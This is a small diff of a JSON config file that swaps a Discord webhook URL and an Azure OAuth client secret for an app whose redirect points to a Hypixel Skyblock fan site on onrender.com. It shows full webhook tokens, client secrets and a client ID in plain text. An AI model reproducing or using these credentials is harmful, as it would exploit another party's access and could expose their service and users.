@@ -8,7 +8,7 @@
     },
 
     "webhook": {
-        "webhookURL": "https://discord.com/api/webhooks/1081943806187946005/m9Wq84ZESWgQV2jAfZb-GoGIO5UfhdCo1Ou_krDrR0Uu7ntirXVQPuDHaJlTOus_9Cl8"
+        "webhookURL": "https://discord.com/api/webhooks/1081948657336733776/kX1ejy93eoMwP-DMfAbQA6gADoYfGvKayCWG-wW-Zh9ZHyHyHf5uWi3npyTFtcKYeDY2"
     },
 
     "discord": {
@@ -17,7 +17,7 @@
 
     "azure" : {
         "client_id": "cf73d00a-3b6e-4abb-862f-286dd90f2f0a",
-        "client_secret": "zxF8Q~oAKwogMD1n-ACF7sDRdmUYhmZouecTpduW",
+        "client_secret": "7aaa3f6c-d09e-461e-997e-2552236af161",
         "redirect_uri": "https://hypixelskyblockfans.onrender.com"
     }
 }
